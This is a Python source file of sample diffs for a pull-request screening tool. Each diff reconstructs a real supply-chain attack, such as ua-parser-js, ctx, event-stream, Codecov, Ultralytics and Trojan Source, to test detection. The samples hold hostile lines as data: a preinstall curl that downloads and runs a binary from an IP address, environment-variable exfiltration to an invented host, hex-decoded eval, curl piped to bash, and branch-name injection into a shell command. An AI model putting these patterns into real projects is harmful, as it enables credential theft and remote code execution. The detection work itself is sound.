"""Examples for the GUI's "Try an example" menu: real incidents only, each with its sources.

Every example recreates the *mechanism* of a documented incident in a few lines. The code is a
simplified, inert reconstruction written for this project, not the attackers' code, and the
summaries are our own words; follow the sources for the full story. The one "quiet" example is an
unmodified real pull request (encode/httpx #3773, BSD-3-Clause) that prscreen should not flag.

Built at import time so this file contains no real-looking secret and no invisible character.
"""

from __future__ import annotations

from typing import Any


def _diff(*files: tuple[str, list[str], list[str]]) -> str:
    out = []
    for path, removed, added in files:
        out += [f"diff --git a/{path} b/{path}", f"--- a/{path}", f"+++ b/{path}"]
        out.append(f"@@ -1,{len(removed)} +1,{len(added)} @@")
        out += [f"-{line}" for line in removed] + [f"+{line}" for line in added]
    return "\n".join(out) + "\n"


def _src(name: str, url: str) -> dict[str, str]:
    return {"name": name, "url": url}


_RLO, _LRI, _PDI = chr(0x202E), chr(0x2066), chr(0x2069)
_FAKE_KEY = "tc-" + "7Qm2xZ9p" + "Lk4vW8rN" + "3sJd"
_INERT_HEX = (
    b"// stand-in for the encrypted flatmap-stream payload: harmless text, decoded and run the same way. "
    b"The real one decrypted with the package description as the key and targeted a bitcoin wallet app."
).hex()

_HTTPX_3773 = """\
diff --git a/tests/models/test_responses.py b/tests/models/test_responses.py
index 06c28e1e30..d2972da5bd 100644
--- a/tests/models/test_responses.py
+++ b/tests/models/test_responses.py
@@ -1011,7 +1011,10 @@ def test_response_decode_text_using_autodetect():

     assert response.status_code == 200
     assert response.reason_phrase == "OK"
-    assert response.encoding == "ISO-8859-1"
+    # The encoded byte string is consistent with either ISO-8859-1 or
+    # WINDOWS-1252. Versions <6.0 of chardet claim the former, while chardet
+    # 6.0 detects the latter.
+    assert response.encoding in ("ISO-8859-1", "WINDOWS-1252")
     assert response.text == text
"""

SAMPLES: list[dict[str, Any]] = [
    {
        "title": "A real, harmless pull request (encode/httpx #3773)",
        "year": "2025",
        "summary": (
            "An ordinary merged pull request from the httpx project, unmodified: it relaxes one test "
            "assertion for a new chardet version. Most real changes look like this, and prscreen "
            "should stay quiet."
        ),
        "recreation": "The original diff, unchanged (BSD-3-Clause).",
        "expect": [],
        "sources": [
            _src("GitHub: encode/httpx pull request #3773", "https://github.com/encode/httpx/pull/3773")
        ],
        "diff": _HTTPX_3773,
    },
    {
        "title": "Toyota T-Connect: access key left in a public repository",
        "year": "2022",
        "summary": (
            "A contractor uploaded part of Toyota's T-Connect source code to a public GitHub "
            "repository. It contained a hardcoded access key for a server holding customer data, "
            "and stayed public from December 2017 to September 2022. Toyota said about 296,000 "
            "customers' email addresses and customer numbers were potentially exposed."
        ),
        "recreation": "A config constant holding a hardcoded access key (the value here is fake).",
        "expect": ["SEC003"],
        "sources": [
            _src(
                "GitGuardian",
                "https://blog.gitguardian.com/toyota-accidently-exposed-a-secret-key-publicly-on-github-for-five-years/",
            ),
            _src(
                "Security Affairs",
                "https://securityaffairs.com/136915/data-breach/toyota-motor-corporation-data-leak.html",
            ),
        ],
        "diff": _diff(
            (
                "tconnect/config.py",
                ['DATA_SERVER_HOST = "db.internal"'],
                ['DATA_SERVER_HOST = "db.internal"', f'DATA_SERVER_ACCESS_KEY = "{_FAKE_KEY}"'],
            )
        ),
    },
    {
        "title": "event-stream: a new dependency with an encrypted payload",
        "year": "2018",
        "summary": (
            "A new maintainer of the popular npm package event-stream added a dependency, "
            "flatmap-stream, that carried an encrypted payload. It only activated inside the Copay "
            "Bitcoin wallet app, where it tried to steal wallet funds."
        ),
        "recreation": "The new dependency, and code that decodes a hex blob and runs it (the blob here is harmless text).",
        "expect": ["DEP001", "OBF004", "OBF005"],
        "sources": [
            _src("Black Duck", "https://www.blackduck.com/blog/malicious-dependency-supply-chain.html"),
            _src(
                "Security Affairs",
                "https://securityaffairs.com/78464/hacking/tainted-event-stream-version.html",
            ),
        ],
        "diff": _diff(
            (
                "package.json",
                ['    "duplexer": "~0.1.1",'],
                ['    "duplexer": "~0.1.1",', '    "flatmap-stream": "0.1.1",'],
            ),
            (
                "lib/flatmap.js",
                [],
                [
                    f"var n = '{_INERT_HEX}';",
                    "!function () { try { new Function(Buffer.from(n, 'hex').toString())(); } catch (e) {} }();",
                ],
            ),
        ),
    },
    {
        "title": "ua-parser-js: hijacked package with an install-time downloader",
        "year": "2021",
        "summary": (
            "Attackers took over the maintainer's npm account and published versions of ua-parser-js "
            "(about 7 million weekly downloads) whose install script fetched a cryptocurrency miner "
            "and, on Windows, a password stealer. CISA and CERT-EU issued alerts."
        ),
        "recreation": "A preinstall hook that runs a script which downloads and starts a binary from a raw IP address.",
        "expect": ["EXE005", "EXE003", "NET001"],
        "sources": [
            _src(
                "CERT-EU advisory 2021-057",
                "https://www.cert.europa.eu/publications/security-advisories/2021-057/",
            ),
            _src(
                "CrowdStrike",
                "https://www.crowdstrike.com/en-us/blog/crowdstrike-customers-protected-from-compromised-npm-package-in-supply-chain-attack/",
            ),
        ],
        "diff": _diff(
            (
                "package.json",
                ['  "scripts": {'],
                ['  "scripts": {', '    "preinstall": "start /B node preinstall.js & node preinstall.js",'],
            ),
            (
                "preinstall.js",
                [],
                [
                    "const { exec } = require('child_process');",
                    "exec(`curl http://159.148.186.228/download/jsextension -o jsextension && ./jsextension &`);",
                ],
            ),
        ),
    },
    {
        "title": "crossenv: a one-typo package that stole environment variables",
        "year": "2017",
        "summary": (
            "An npm user published about 40 packages named one typo away from popular ones, including "
            "crossenv for cross-env. On install they sent the developer's environment variables, "
            "which often hold credentials, to the attacker's server."
        ),
        "recreation": "A project adding the typo'd package name to its dependencies.",
        "expect": ["DEP001", "DEP002"],
        "sources": [
            _src(
                "The Register",
                "https://www.theregister.com/security/2017/08/03/this-typosquatting-attack-on-npm-went-undetected-for-2-weeks/1282093",
            ),
            _src("GitLab advisory database", "https://advisories.gitlab.com/pkg/npm/crossenv/"),
        ],
        "diff": _diff(
            (
                "package.json",
                ['  "devDependencies": {'],
                ['  "devDependencies": {', '    "crossenv": "^6.1.1",'],
            )
        ),
    },
    {
        "title": "ctx (PyPI): a hijacked package that sent out every environment variable",
        "year": "2022",
        "summary": (
            "The dormant PyPI package ctx was taken over after its maintainer's email domain expired. "
            "New versions sent all environment variables, including AWS keys, to a Heroku endpoint. "
            "The person responsible later called it ethical research."
        ),
        "recreation": "Code that encodes the whole environment and sends it to a new host (the host here is invented).",
        "expect": ["NET004", "NET003"],
        "sources": [
            _src(
                "BleepingComputer",
                "https://www.bleepingcomputer.com/news/security/popular-python-and-php-libraries-hijacked-to-steal-aws-keys/",
            ),
            _src(
                "BleepingComputer (follow-up)",
                "https://www.bleepingcomputer.com/news/security/hacker-says-hijacking-libraries-stealing-aws-keys-was-ethical-research/",
            ),
        ],
        "diff": _diff(
            (
                "ctx/__init__.py",
                ["import os"],
                [
                    "import base64, os, requests",
                    "payload = base64.b64encode(str(os.environ).encode()).decode()",
                    'requests.post("https://metrics-collector-demo.herokuapp.com/ingest", data=payload)',
                ],
            )
        ),
    },
    {
        "title": "Codecov: CI pipelines piping a remote script into bash",
        "year": "2021",
        "summary": (
            "Attackers modified Codecov's Bash Uploader, a script that CI pipelines downloaded and ran "
            "directly. For about two months it sent those pipelines' environment variables, which "
            "often hold secrets, to the attackers."
        ),
        "recreation": "A CI step that downloads the uploader and runs it in one go, the way many pipelines did.",
        "expect": ["EXE001"],
        "sources": [
            _src(
                "BleepingComputer",
                "https://www.bleepingcomputer.com/news/security/codecov-starts-notifying-customers-affected-by-supply-chain-attack/",
            ),
            _src(
                "CPO Magazine",
                "https://www.cpomagazine.com/cyber-security/codecov-supply-chain-attack-remained-undetected-for-months-and-potentially-affected-major-companies-including-google-ibm-hp-and-others/",
            ),
        ],
        "diff": _diff(
            (
                ".github/workflows/ci.yml",
                ["      - run: pytest --cov"],
                ["      - run: pytest --cov", "      - run: bash <(curl -s https://codecov.io/bash)"],
            )
        ),
    },
    {
        "title": "PyTorch nightly: dependency confusion through an extra index",
        "year": "2022",
        "summary": (
            "PyTorch's nightly builds were installed with --extra-index-url pointing at PyTorch's own "
            "package index. Someone published a package named torchtriton on PyPI, which pip "
            "preferred, and it collected system data and SSH keys. Its publisher called it research."
        ),
        "recreation": "A requirements file that adds an extra package index.",
        "expect": ["DEP003"],
        "sources": [
            _src(
                "SC Media",
                "https://www.scworld.com/analysis/popular-machine-learning-framework-pytorch-compromised-with-malicious-dependency",
            ),
            _src(
                "Security Affairs", "https://securityaffairs.com/140228/hacking/pytorch-confusion-attack.html"
            ),
        ],
        "diff": _diff(
            (
                "requirements.txt",
                ["numpy==1.24.1"],
                ["--extra-index-url https://download.pytorch.org/whl/nightly/cpu", "numpy==1.24.1", "torch"],
            )
        ),
    },
    {
        "title": "Ultralytics: a branch name injected into a privileged workflow",
        "year": "2024",
        "summary": (
            "A workflow running on pull_request_target pasted the pull request's branch name into a "
            "shell command. An attacker opened pull requests whose branch names contained commands, "
            "got code running with release rights, and published Ultralytics versions to PyPI that "
            "installed a cryptocurrency miner."
        ),
        "recreation": "A pull_request_target workflow that expands the branch name inside a run script.",
        "expect": ["CI001", "CI003"],
        "sources": [
            _src("LWN.net", "https://lwn.net/Articles/1001215/"),
            _src(
                "William Woodruff (zizmor)",
                "https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection",
            ),
        ],
        "diff": _diff(
            (
                ".github/workflows/format.yml",
                ["  pull_request:"],
                [
                    "  pull_request_target:",
                    "jobs:",
                    "  format:",
                    "    steps:",
                    '      - run: git checkout "${{ github.head_ref }}" && ruff format .',
                ],
            )
        ),
    },
    {
        "title": "tj-actions/changed-files: a movable tag repointed to malicious code",
        "year": "2025",
        "summary": (
            "Attackers moved the version tags of the widely used tj-actions/changed-files GitHub Action "
            "to code that printed CI secrets into workflow logs (CVE-2025-30066). Workflows pinned to "
            "a commit SHA were not affected. prscreen can't see the payload, which lived inside the "
            "action; it flags the movable reference that let the attack in, at low severity."
        ),
        "recreation": "A workflow that uses the action by tag rather than by commit.",
        "expect": ["CI005"],
        "sources": [
            _src(
                "CISA alert",
                "https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction",
            ),
            _src(
                "The Hacker News", "https://thehackernews.com/2025/03/github-action-compromise-puts-cicd.html"
            ),
        ],
        "diff": _diff(
            (
                ".github/workflows/ci.yml",
                ["      - uses: actions/checkout@v4"],
                ["      - uses: actions/checkout@v4", "      - uses: tj-actions/changed-files@v45"],
            )
        ),
    },
    {
        "title": "Trojan Source: invisible characters that reorder code (research)",
        "year": "2021",
        "summary": (
            "University of Cambridge researchers showed that invisible Unicode direction characters can "
            "make code display differently from how compilers read it (CVE-2021-42574). It is "
            "published research: no attack using it in the wild is known."
        ),
        "recreation": "An admin check that looks like a comment, built the way the paper describes.",
        "expect": ["OBF001"],
        "sources": [
            _src(
                "BleepingComputer",
                "https://www.bleepingcomputer.com/news/security/trojan-source-attack-method-can-hide-bugs-into-open-source-code/",
            ),
            _src("Wikipedia: Trojan Source", "https://en.wikipedia.org/wiki/Trojan_Source"),
        ],
        "diff": _diff(
            (
                "app/auth.py",
                ['    return user.role == "admin"'],
                [f'    return user.role != "user{_RLO} {_LRI}# admin only{_PDI} {_LRI}"'],
            )
        ),
    },
]
